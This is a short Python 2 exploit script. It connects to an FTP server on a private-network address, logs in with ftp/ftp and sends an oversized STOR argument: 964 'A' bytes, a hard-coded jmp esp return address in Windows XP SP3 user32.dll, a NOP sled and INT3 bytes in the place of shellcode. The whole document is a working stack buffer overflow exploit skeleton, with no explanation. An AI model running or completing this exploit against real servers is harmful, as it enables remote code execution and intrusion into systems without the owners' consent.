#!/usr/bin/python

import socket

#7e429353 jmp esp user32.dll xp sp3 eng
ret ="\x53\x93\x42\x7e"		

buffer='\x41' * 964 + ret + '\x90' * 16 + '\xCC'  * 1016

print "Buffer inviato"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.254.131',21))
data=s.recv(1024)

s.send('USER ftp\r\n')
data=s.recv(1024)

s.send('PASS ftp\r\n')
data=s.recv(1024)

s.send('STOR '+buffer+'\r\n')
s.close

